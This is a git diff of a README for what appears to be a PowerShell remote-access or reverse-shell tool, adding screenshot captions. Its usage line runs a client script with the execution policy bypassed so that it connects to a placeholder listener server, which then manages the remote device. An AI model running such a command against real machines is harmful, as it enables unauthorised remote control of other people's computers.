@@ -26,7 +26,8 @@ This is only for testing purposes, not intended for anything illegal. I was test
         - `powershell -ep bypass .\client.ps1 -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
 
 # Screenshot examples:
-
+- Client connects to <LSTNR_SERVER>
 <img width="702" alt="Screenshot 2025-01-04 at 10 49 03 PM" src="https://github.com/user-attachments/assets/c3027a17-1340-4f64-ac6c-776046003fd9" />
 
+- LSTNR Server catches connection, and is able to manage remote device
 <img width="722" alt="Screenshot 2025-01-04 at 10 48 47 PM" src="https://github.com/user-attachments/assets/4725cf8a-4ab0-47b7-9d36-acf0e5256f99" />
